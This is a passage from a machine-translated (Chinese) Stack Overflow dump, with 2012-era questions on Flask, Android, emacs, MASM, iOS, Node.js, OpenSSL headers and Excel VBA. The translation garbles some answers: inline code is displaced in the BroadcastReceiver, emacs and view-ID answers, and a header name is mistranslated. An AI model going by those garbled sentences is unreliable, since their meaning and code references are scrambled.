File "/Users/Spike/python/helloflask/venv/lib/python2.7/site-packages/flask/app.py", line 1506, in wsgi_app
response = self.make_response(self.handle_exception(e))
File "/Users/Spike/python/helloflask/venv/lib/python2.7/site-packages/flask/app.py", line 1504, in wsgi_app
response = self.full_dispatch_request()
File "/Users/Spike/python/helloflask/venv/lib/python2.7/site-packages/flask/app.py", line 1265, in full_dispatch_request
response = self.make_response(rv)
File "/Users/Spike/python/helloflask/venv/lib/python2.7/site-packages/flask/app.py", line 1332, in make_response
raise ValueError('View function did not return a response')
ValueError: View function did not return a response 
```

我已经做了一些测试并打印了电子邮件，果然，搜索词不在那里。这意味着脚本每运行三次，它就会拉出一封电子邮件，因为它包含一个实际上并不包含的搜索词。这对我来说很神秘。有谁知道到底发生了什么？

相关代码：

```
clean2 = [feeling.strip() for feeling in open('feeling2.txt').readlines()] #open the txt file full of feelings from the wefeelfine api
random_feeling = random.choice(clean2) 
print "this is a random feeling", random_feeling
status, numbers_list = s.search(None, '(BODY "%s")' % random_feeling) #searching the mailbox, finding ids with that search term, saving to list
numbers.append(numbers_list) #append the numbers list

smsgids = str(numbers) #turning the numbers list into a string
ids_list = smsgids.strip().split(' ') #splitting it into a list
msg_random = random.choice(ids_list) #pulling a random id from the id list
typ, msg_data = s.fetch(msg_random, '(BODY[TEXT])') #pulling the message and saving it as a variable

soup = BeautifulSoup(repr(msg_data), "html5lib") #turning it into a beautifulsoup object, but as a string first
text = soup.find_all("div") #finding all of the html div tags and saving it as a variable
as_text = [item.text for item in text]
chat_text = '\n'.join(as_text)
print chat_text
for line in as_text:
    print random_feeling
    print line
    if random_feeling in line:
        return line 
```

# android - 我需要创建一个服务，该服务将在某些事件后进行祝酒，并且在用户停止之前不会停止

> ID：10220891
> 
> 赞同：-1
> 
> 时间：2012-04-19T02:34:55.533
> 
> 标签：android, service, toast

我目前正在使用我的第一个 Android 应用程序，但遇到了麻烦。我有一个将启动服务的主要活动，每次屏幕打开时，它都应该祝酒。唯一的问题是我以前从未使用过 Service，而且我不知道如何使它与我的 Activity 交互，即：toast 将是用户定义的字符串。

我不是要求任何人为我写它，我只需要一些帮助指向正确的方向。

如果上述情况不清楚，基本上，我想要一个服务，它会在主要活动开始时启动，然后在每次发生某些事情时（比如屏幕打开或手机被解锁）都祝酒，并且也只停止当用户按下停止。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:57:19.033

如果您在with`BroadcastReceiver`中注册它，它会接收系统通知。然后，您可以使用它来启动 a或an`androidmanifest.xml``IntentFilters``Service``Activity``PendingIntent`

# windows - sh.exe”：emacs：找不到命令（Git bash Windows）

> ID：10220893
> 
> 赞同：5
> 
> 时间：2012-04-19T02:35:13.147
> 
> 标签：windows, git, bash, emacs

我在 Windows 7 上使用 Git Bash，并且在将 emacs 设置为默认文本编辑器时遇到问题 - 我尝试过`git config --global core.editor emacs`，然后`git config --global core.editor "'C:/emacs-23.3/bin/runemacs.exe'"`，`git config --global core.editor emacsclientw`但无济于事。每次我在 Bash 中输入“emacs README.txt”之类的内容时，都会显示以下错误：

> sh.exe”：emacs：找不到命令

我已经忍受了最长时间，选择单独打开 emacs 并打开相关文件，但这次我真的想正确设置，以便我可以节省时间并简单地从 Git Bash 调用 emacs . 有谁知道我能做什么？在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T06:55:20.413

`emacs`您需要确保 emacs bin 目录位于 PATH 上，以便在输入或时可以找到二进制文件`emacsclient`。您可以通过将环境变量设置`EDITOR`为`emacsclient`. 您应该使用 emacsclient 而不是 emacsclientw，因为您需要启动工具来等待编辑完成，而他们通过等待编辑器退出来做到这一点。如果您只想让 git 使用它，那么`git config --global core.editor emacsclient`可以完成这项工作，或者在环境中设置 GIT_EDITOR=emacsclient 。

总之：

```
PATH=c:\emacs-23.3\bin;%PATH%
EDITOR=emacsclient
export PATH EDITOR 
```

或修复 Windows 系统环境中的等效项。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T08:21:59.730

也可以试试 magit，在 emacs 中使用 Git 真是太神奇了。你可以从[https://github.com/magit/magit](https://github.com/magit/magit)

# assembly - x86 汇编-简单的算术程序不起作用，xp 上的 MASM32

> ID：10220894
> 
> 赞同：0
> 
> 时间：2012-04-19T02:35:18.107
> 
> 标签：assembly, x86, masm32

我有一个简单的程序，它添加 1+1 直到达到一百万，然后打印“完成！” 到控制台。但是当它运行时，它什么也不做。这是代码：

```
.386
.model flat, stdcall
option casemap :none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
.data
          main dd 0
          msg  db "Done!", 0
.code      
start:      
_loop:    mov eax, 1 
          mov main, eax
          cmp main, 1000000
          jz _next
          jmp _loop
_next:    invoke StdOut, addr msg
          invoke ExitProcess, 0
end start 
```

当我运行它时它什么也没做。我不明白为什么。我目前通过 cmd 运行它，通过单击并将其拖动到提示符并按 Enter 键。此外，MASM32 是最容易学习的汇编程序，还是有更好更容易的汇编程序？如果是这样，有人可以发布更好的吗？谢谢。我只需要某个地方开始学习 x86 汇编。

提前致谢，

程序

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T02:37:31.427

您的程序不会增加任何内容。您可能需要`add`在某处获得说明。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-26T16:18:08.997

有各种错误。为了清楚起见和其他阅读这篇文章的用户......

EAX 在每个循环中设置为 1：

```
_loop:
mov eax, 1         ;eax set to 1 
```

无需移动 eax 中的值 - 直接针对 eax 进行测试。

```
mov main, eax 
```

OP希望每次增加1，因此缺少的指令是“inc eax”-不需要“add”：

```
start:
xor eax,eax     ;eax=0
_loop:          ;Begin loop
  inc eax         ;Increment eax by 1 each loop
  cmp eax,1000000 ;Compare
  je _next        ;Done - exit loop
  jmp _loop       ;Continue loop

_next:
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-25T14:26:23.507

```
.386
.model flat, stdcall
option casemap :none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
.data
    main dd 0
    msg  db "Done!", 0
.code      
start:      
    mov     eax,1               ;set eax register to 1
IncreaseBy_1:
    inc     eax                 ;increase eax by 1
    cmp     eax,1000000         ;compare eax to 1000000
    jnz     IncreaseBy_1        ;jump if eax not equal to 1000000 
_next:    
    invoke  StdOut,addr msg
    invoke  ExitProcess,0
end start 
```

# iphone - Xcode，仅检索带有字母 A 的地址簿姓氏（等等）

> ID：10220898
> 
> 赞同：1
> 
> 时间：2012-04-19T02:35:35.987
> 
> 标签：iphone, ios, xcode, ipad, addressbook

我无法检索我的通讯录的姓氏。我只想按字母表中的每个字母检索姓氏。

这是我到目前为止的代码

```
ABAddressBookRef addressBook = ABAddressBookCreate();
totalPeople = (__bridge_transfer NSMutableArray *)ABAddressBookCopyArrayOfAllPeople(addressBook);

NSString *aString = @"A";

for(int i =0;i<[totalPeople count];i++){
    ABRecordRef thisPerson = (__bridge ABRecordRef)
    [totalPeople objectAtIndex:i];
    lastName = (__bridge_transfer NSString *) ABRecordCopyValue(thisPerson, kABPersonLastNameProperty);
} 
```

我不知道之后该怎么办，谢谢你看这个。

现在是这样的

```
 ABAddressBookRef addressBook = ABAddressBookCreate();
totalPeople = (__bridge_transfer NSMutableArray *)ABAddressBookCopyArrayOfAllPeople(addressBook);

NSString *aString = @"A";

for(int i =0;i<[totalPeople count];i++){
    ABRecordRef thisPerson = (__bridge ABRecordRef)
    [totalPeople objectAtIndex:i];
    lastName = (__bridge_transfer NSString *) ABRecordCopyValue(thisPerson, kABPersonLastNameProperty);

    NSString *firstLetterOfCopiedName = [lastName substringWithRange: NSMakeRange(0,1)];
    if ([firstLetterOfCopiedName compare: aString options: NSCaseInsensitiveSearch] == NSOrderedSame) {
        //This person's last name matches the string aString
        aArray = [[NSArray alloc]initWithObjects:lastName, nil];
    }

} 
```

它只向数组添加一个名称，我应该怎么做才能将它全部添加。对不起，我对 ios 开发还很陌生！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:54:37.540

您可以使用类似的东西并将结果存储在数组中或返回结果。（未测试）

```
NSString *firstLetterOfCopiedName = [lastName substringWithRange: NSMakeRange(0,1)];
if ([firstLetterOfCopiedName compare: aString options: NSCaseInsensitiveSearch] == NSOrderedSame) {
    //This person's last name matches the string aString
} 
```

您需要在循环之外分配数组（否则它只会包含一个对象），数组也必须是 NSMutableArray（因此可以修改）。这是一个例子：

```
ABAddressBookRef addressBook = ABAddressBookCreate();
totalPeople = (__bridge_transfer NSMutableArray*)ABAddressBookCopyArrayOfAllPeople(addressBook);

NSString *aString = @"A";

//This is the resulting array
NSMutableArray *resultArray = [[NSMutableArray alloc] init];

for(int i =0;i<[totalPeople count];i++){
    ABRecordRef thisPerson = (__bridge ABRecordRef)
    [totalPeople objectAtIndex:i];
    lastName = (__bridge_transfer NSString *) ABRecordCopyValue(thisPerson, kABPersonLastNameProperty);

    NSString *firstLetterOfCopiedName = [lastName substringWithRange: NSMakeRange(0,1)];
    if ([firstLetterOfCopiedName compare: aString options: NSCaseInsensitiveSearch] == NSOrderedSame) {
        //This person's last name matches the string aString
        [resultArray addObject: lastName];
    }

}

//print contents of array
for(NSString *lastName in resultArray) {
    NSLog(@"Last Name: %@", lastName);
} 
```

# node.js - 带有 Socket.io 的简单 Node.js 应用程序无法加载客户端 JavaScript

> ID：10220903
> 
> 赞同：2
> 
> 时间：2012-04-19T02:36:34.850
> 
> 标签：node.js, express, socket.io

这太令人沮丧了，试图让一个简单的 node.js + socket.io 应用程序运行，但客户端无法加载 javascript 库。

```
 GET http://localhost:4000/socket.io/socket.io.js 404 (Not Found) 
```

这是 node.js 应用程序：

```
var app = require('express').createServer();
var io = require('socket.io').listen(app);
io.set('log level', 1);

app.listen(4000);

app.get('/', function(req, res) {
    res.sendfile(__dirname + '/index.html');
});

io.sockets.on('connection', function(socket) {
    console.log("got a connection");
}); 
```

任何想法可能会发生什么？

# c++ - c/c++ 预处理器：如何确保包含正确的文件

> ID：10220904
> 
> 赞同：2
> 
> 时间：2012-04-19T02:36:45.010
> 
> 标签：c++, c, c-preprocessor

我将在本示例中使用 openssl 安装的标头结构：

```
/usr/include        *（或 Windows 框中包含搜索路径中的某个文件夹）*
  |
  + --openssl
       |
       +-- e_os2.h
       +-- rsa.h
       +-- 沙.h
      ...

```

`/usr/include`在编译器中包含搜索路径。OpenSSL 标头通常以这种方式包含：`#include <openssl/sha.h>`

作为第一行，openssl/sha.h 包含以下内容：`#include <openssl/e_os2.h>`. 所以，我的问题是：安装的标头以这种方式引用同一文件夹中的标头真的是个好主意吗？当它以这种方式引用 e_os2.h 时，它可能会从其他位置获取 e_os2.h，不一定在与 sha.h 相同的文件夹中。例如，如果我在某个位置有一个 openssl 的本地副本包含并以这种方式包含该 sha.h：`#include "../../3rdpath/openssl/sha.h`那么通过组合不兼容的标头版本，我可能会在我的代码中遇到一些讨厌的错误。

考虑到编译器的行为`#incldue <...>`与`#incldue "..."`openssl 之类的库包含其标头的正确方法不同这一事实？

我想，openssl 的做法是最错误的做法。另外两种方式是：

```
a) #include "e_os2.h"
```

和

```
b) #include "./e_os2.h"
```

openssl的方式是：

```
c) #include <openssl/e_os2.h>
```

像在openssl中那样做这个决定是错误的吗？a) 或 b) 有什么问题吗？b) 意味着仅从同一个文件夹中包含 e_os2.h，所有主要编译器（ms cl、armcc、intel cl、gcc 等）都能保证吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:48:06.997

你的第一个选择是最容易做错事的；它将在完全属于其他库的标头包中按给定名称查找文件。您的第二个充其量会给出未定义的行为；我不希望它在大多数情况下都能正常工作。第三种方式是正确的方式；它只会包含 openssl 的文件版本。如果您安排通过在包含路径中放置另一个不完整的目录来替换某些标题`openssl`，那么我假设您知道自己在做什么。

# android - 应用程序强制在启动时关闭

> ID：10220905
> 
> 赞同：3
> 
> 时间：2012-04-19T02:36:49.220
> 
> 标签：android, sockets, android-activity, forceclose

好吧，我正在尝试制作一个与我已经设置、测试并在一个简单的 java 应用程序的后台工作的套接字通信的应用程序。

问题是，我的应用程序会立即强制关闭。在fcs之前你没有机会看到任何东西。

这是我的代码：

```
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Scanner;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.Toast;

public class LogMeInClientActivity extends Activity {
    private Socket s;
    private InetAddress hostIp, localIp;
    private final String hostName = "localhost";
    private final int port = 4000;
    private Scanner in;
    private PrintWriter out;
    private final EditText usernameField = (EditText)     findViewById(R.id.username_field),
            passwordField = (EditText) findViewById(R.id.password_field);
    private String username, password;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        System.out.println("A");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        System.out.println("B");
        try {
            hostIp = InetAddress.getByName(hostName);
            localIp = InetAddress.getLocalHost();
            System.out.println("Local Ip: " + localIp.toString());
            System.out.println("Host Ip: " + hostIp.toString());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        try {
            s = new Socket(hostIp, port);
            out = new PrintWriter(s.getOutputStream(), true);
            in = new Scanner(s.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private class SignInButtonListener implements OnClickListener {

        public void onClick(View clickedButton) {
            switch (clickedButton.getId()) {
            case R.id.sign_in:
                username = usernameField.getText().toString();
                password = passwordField.getText().toString();
                if (username.length() != 0 && password.length() != 0) {
                    out.println(username);
                    out.println(password);
                }
                out.flush();
                break;

            default:
                break;
            }
        }
    }
} 
```

在上面的代码中，“A”或“B”都不会打印出来。该应用程序只是fc的。

这是我的清单：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.chriswins2much.Util"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="15" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:name=".LogMeInClientActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

我使用了上述许可，因为我听说它会有所帮助。

我更新了代码以修复 EditText NullPointerException 修复（仅更改部分）：

```
private EditText usernameField, passwordField;
public void onCreate(Bundle savedInstanceState) {
        System.out.println("A");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        usernameField = (EditText) findViewById(R.id.username_field);
        passwordField = (EditText) findViewById(R.id.password_field);
        System.out.println("B");
        try {
                    // It's saying one of the errors are on line 37 (directly below)
            hostIp = InetAddress.getByName(hostName);
            localIp = InetAddress.getLocalHost();
            System.out.println("Local Ip: " + localIp.toString());
            System.out.println("Host Ip: " + hostIp.toString());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        try {
            s = new Socket(hostIp, port);
            out = new PrintWriter(s.getOutputStream(), true);
            in = new Scanner(s.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
    } 
```

新的logcat如下：

```
04-19 02:46:56.292: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:57.049: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:46:57.103: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:57.450: E/dalvikvm(1289): Unable to open stack trace file '/data/anr/traces.txt': Permission denied
04-19 02:46:57.462: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:57.669: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:46:58.069: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:58.409: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:46:58.650: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:58.779: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:46:59.009: I/System.out(1289): A
04-19 02:46:59.153: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:59.321: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:46:59.639: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:46:59.879: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:00.249: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:00.490: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:00.819: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:00.970: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:01.279: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:01.477: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:01.791: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:01.919: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:02.302: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:02.443: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:02.811: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:02.999: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:03.409: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:03.583: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:03.870: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:04.029: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:04.410: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:04.529: I/System.out(1289): B
04-19 02:47:04.603: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:04.850: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:05.020: D/AndroidRuntime(1289): Shutting down VM
04-19 02:47:05.020: W/dalvikvm(1289): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
04-19 02:47:05.101: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:05.460: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:05.510: E/AndroidRuntime(1289): FATAL EXCEPTION: main
04-19 02:47:05.510: E/AndroidRuntime(1289): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.chriswins2much.Util/com.chriswins2much.Util.LogMeInClientActivity}: android.os.NetworkOnMainThreadException
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread.access$600(ActivityThread.java:123)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.os.Looper.loop(Looper.java:137)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread.main(ActivityThread.java:4424)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at java.lang.reflect.Method.invokeNative(Native Method)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at java.lang.reflect.Method.invoke(Method.java:511)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at dalvik.system.NativeStart.main(Native Method)
04-19 02:47:05.510: E/AndroidRuntime(1289): Caused by: android.os.NetworkOnMainThreadException
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1099)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at java.net.InetAddress.lookupHostByName(InetAddress.java:391)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at java.net.InetAddress.getAllByNameImpl(InetAddress.java:242)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at java.net.InetAddress.getByName(InetAddress.java:295)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at com.chriswins2much.Util.LogMeInClientActivity.onCreate(LogMeInClientActivity.java:37)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.Activity.performCreate(Activity.java:4465)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-19 02:47:05.510: E/AndroidRuntime(1289):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-19 02:47:05.510: E/AndroidRuntime(1289):     ... 11 more
04-19 02:47:05.779: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt'
04-19 02:47:06.839: I/dalvikvm(1289): threadid=3: reacting to signal 3
04-19 02:47:07.000: I/dalvikvm(1289): Wrote stack traces to '/data/anr/traces.txt' 
```

！注意：这是一个新的、新的更新代码。强制关闭已修复！！！谢谢白痴！不过还是有问题。它没有连接到我在 java 中在 localhost:4000 上设置的端口。我已经尝试过非Android，它工作正常。这是我修复强制关闭的代码：

```
public void onCreate(View v){
    // Code...
        new Thread(new Runnable() {
            public void run(){
                try {
                    hostIp = InetAddress.getByName(hostName);
                    localIp = InetAddress.getLocalHost();
                    System.out.println("Local Ip: " + localIp.toString());
                    System.out.println("Host Ip: " + hostIp.toString());
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                }
                try {
                    s = new Socket(hostIp, port);
                    out = new PrintWriter(s.getOutputStream(), true);
                    in = new Scanner(s.getInputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

} 
```

下面是新的logcat（它的后半部分）：

```
04-19 03:38:02.920: I/System.out(1490): Local Ip: localhost/127.0.0.1
04-19 03:38:03.099: I/System.out(1490): Host Ip: localhost/127.0.0.1
04-19 03:38:05.420: W/System.err(1490): java.net.ConnectException: failed to connect to localhost/127.0.0.1 (port 4000): connect failed: ECONNREFUSED (Connection refused)
04-19 03:38:05.711: W/System.err(1490):     at libcore.io.IoBridge.connect(IoBridge.java:114)
04-19 03:38:05.711: W/System.err(1490):     at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:192)
04-19 03:38:05.781: W/System.err(1490):     at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172)
04-19 03:38:05.781: W/System.err(1490):     at java.net.Socket.startupSocket(Socket.java:566)
04-19 03:38:05.803: W/System.err(1490):     at java.net.Socket.<init>(Socket.java:225)
04-19 03:38:05.809: W/System.err(1490):     at com.chriswins2much.Util.LogMeInClientActivity$1.run(LogMeInClientActivity.java:48)
04-19 03:38:05.839: W/System.err(1490):     at java.lang.Thread.run(Thread.java:856)
04-19 03:38:05.859: W/System.err(1490): Caused by: libcore.io.ErrnoException: connect failed: ECONNREFUSED (Connection refused)
04-19 03:38:05.925: W/System.err(1490):     at libcore.io.Posix.connect(Native Method)
04-19 03:38:05.939: W/System.err(1490):     at libcore.io.BlockGuardOs.connect(BlockGuardOs.java:85)
04-19 03:38:05.979: W/System.err(1490):     at libcore.io.IoBridge.connectErrno(IoBridge.java:127)
04-19 03:38:05.979: W/System.err(1490):     at libcore.io.IoBridge.connect(IoBridge.java:112)
04-19 03:38:05.989: W/System.err(1490):     ... 6 more
04-19 03:38:06.692: D/gralloc_goldfish(1490): Emulator without GPU emulation detected. 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-20T23:55:25.373

好的......显然这是“本地主机”的事情。Android 运行在另一个子网上并为自己保留 127.0.0.1，所以当我尝试连接到我在 localhost:4000 上设置的服务器时，我调用的是 Android 保留的 localhost ip 127.0.0.1，而计算机的 localhost ip 更改为10.0.2.2 在端口 4000 上。

修复实施了吗？这很简单：

我改变了这个

```
private final String hostName = "localhost"; 
```

对此

```
private final String hostName = "10.0.2.2"; 
```

或者，如果我已经尝试使用我的 IP 地址（不是本地主机地址），那么它应该也能正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T05:19:21.290

你的问题是 AndroidManifest.xml

如果您将
**uses-sdk android:minSdkVersion="15" 更改为 uses-sdk android:minSdkVersion="8"** 程序就可以了。

我不知道路

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T03:12:44.657

我认为您正在使用与互联网相关的东西。我没有在你的清单文件中看到许可。

```
<uses-permission android:name="android.permissions.INTERNET" /> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T02:40:58.523

这些代码可能有一些问题：

```
 private final EditText usernameField = (EditText) findViewById(R.id.username_field),
            passwordField = (EditText) findViewById(R.id.password_field); 
```

视图需要 init after `setContentView`，所以改为：

```
private EditText usernameField,passwordField; 
```

在之后添加以下代码`setContentView`：

```
usernameField = (EditText) findViewById(R.id.username_field),
passwordField = (EditText) findViewById(R.id.password_field); 
```

如果它不能解决您的问题，您需要检查视图 ID：是否存在于您的`R.id.username_field`文件中。`R.id.password_field``main.xml`

更新：

你的新错误：`NetworkOnMainThreadException`

> 这仅针对面向 Honeycomb SDK 或更高版本的应用程序抛出。允许以早期 SDK 版本为目标的应用程序在其主事件循环线程上进行网络连接，但非常不鼓励这样做。请参阅文档设计响应性。

它就像你`InetAddress.getByName`需要阻止`main thread`，所以尝试在另一个线程中使用，或者将 sdk 目标版本更改为低，如：< 11 (android 3.0)

另外，您需要在 xml 中添加网络权限：

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

# excel - 如何在不破坏表格的情况下选择清除表格内容？

> ID：10220906
> 
> 赞同：17
> 
> 时间：2012-04-19T02:37:16.313
> 
> 标签：excel, excel-2010, vba

我在 excel 2010 中有一个 vba 函数，我在这里使用人们的帮助构建了它。此功能复制表格/表格的内容，对它们进行排序，并将它们发送到适当的表格。

现在运行此功能后，我希望清除原始表。假设 ACell 已定义为表中的第一个单元格，我可以使用以下代码实现此目的。 `ACell.ListObject.Range.ClearContents`工作正常，唯一的问题是它删除了表以及数据值。

有没有办法解决？我宁愿每次输入一些数据时都不必设置表格。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-04-19T03:05:51.753

怎么样：

```
ACell.ListObject.DataBodyRange.Rows.Delete 
```

这将保留您的表格结构和标题，但清除所有数据和行。

编辑：我将只修改[您之前帖子](https://stackoverflow.com/questions/10183980/excel-2010-vba-how-to-select-table-rows-complete-table/10184127#10184127)中的一部分答案，因为它主要是您想要的。只剩下一行：

```
With loSource
   .Range.AutoFilter
   .DataBodyRange.Offset(1).Resize(.DataBodyRange.Rows.Count - 1, .DataBodyRange.Columns.Count).Rows.Delete
   .DataBodyRange.Rows(1).Specialcells(xlCellTypeConstants).ClearContents
End With 
```

如果您想保留所有行及其公式等，只需执行以下操作：

```
With loSource
   .Range.AutoFilter
   .DataBodyRange.Specialcells(xlCellTypeConstants).ClearContents
End With 
```

这与@Readify 的建议很接近，但它不会清除公式。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-19T03:12:13.470

尝试只清除数据（不是整个表，包括标题）：

```
ACell.ListObject.DataBodyRange.ClearContents 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-12-19T17:07:55.943

我重新设计了 Doug Glancy 的解决方案以避免行删除，这可能导致公式中的 #Ref 问题。

```
Sub ListReset(lst As ListObject)
'clears a listObject while leaving row 1 empty, with formulae
    With lst
        If .ShowAutoFilter Then .AutoFilter.ShowAllData
        On Error Resume Next
        With .DataBodyRange
            .Offset(1).Rows.Clear
            .Rows(1).SpecialCells(xlCellTypeConstants).ClearContents
        End With
        On Error GoTo 0
        .Resize .Range.Rows("1:2")
    End With
End Sub 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-06-17T03:40:03.143

有一个条件是这些解决方案中的大多数都没有解决的。我修改了 Patrick Honorez 的解决方案来处理它。我觉得我必须分享这个，因为当原始功能偶尔会清除我预期的更多数据时，我感到很困惑。

这种情况发生在*表格只有一列*并且`.SpecialCells(xlCellTypeConstants).ClearContents`尝试清除第一行的内容时。在这种情况下，只选择了一个单元格（只有一列的表格的顶行），并且 SpecialCells 命令应用于整个工作表而不是选定的范围。发生在我身上的是*我桌子外面的其他单元格也被清除了。*

我做了一些挖掘，从 Mathieu Guindon 那里找到了这个建议： [Range SpecialCells ClearContents clears whole sheet](https://stackoverflow.com/a/40537877/1898524)

> Range({any single cell}).SpecialCells({whatever}) 似乎适用于整个工作表。
> 
> Range({more than one cell}).SpecialCells({whatever}) 似乎对指定的单元格有效。

如果列表/表格只有一列（在第 1 行），此修订版将检查单元格是否有公式，如果没有，它将只清除该单元格的内容。

```
Public Sub ClearList(lst As ListObject)
'Clears a listObject while leaving 1 empty row + formula
' https://stackoverflow.com/a/53856079/1898524
'
'With special help from this post to handle a single column table.
'   Range({any single cell}).SpecialCells({whatever}) seems to work off the entire sheet.
